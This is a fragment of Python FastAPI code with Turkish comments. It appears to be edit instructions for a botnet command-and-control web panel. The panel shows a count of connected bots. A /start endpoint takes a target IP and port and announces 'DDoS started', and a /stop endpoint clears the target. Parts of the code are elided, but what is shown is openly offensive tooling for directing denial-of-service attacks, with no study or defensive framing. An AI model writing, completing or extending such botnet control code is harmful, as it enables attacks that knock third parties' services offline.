...
from fastapi.responses import HTMLResponse   # <<< BU SATIRI EKLE
...
@app.get("/panel", response_class=HTMLResponse)  # <<< BURAYA EKLE
async def panel():
    online = len(bots)
...
async def start(ip: str = Form(...), port: int = Form(...)):
    ...
    ddos_target = ip
    ddos_port = port
    return HTMLResponse("<h1 style='color:#00ff41;text-align:center;'>DDoS BAŞLADI</h1><meta http-equiv='refresh' content='2;url=/panel'>")

@app.post("/stop")
async def stop():
    global ddos_target
    ddos_target = ""
    return HTMLResponse("<h1 style='color:#ff0066;text-align:center;'>DDoS DURDU</h1><meta http-equiv='refresh' content='2;url=/panel'>")
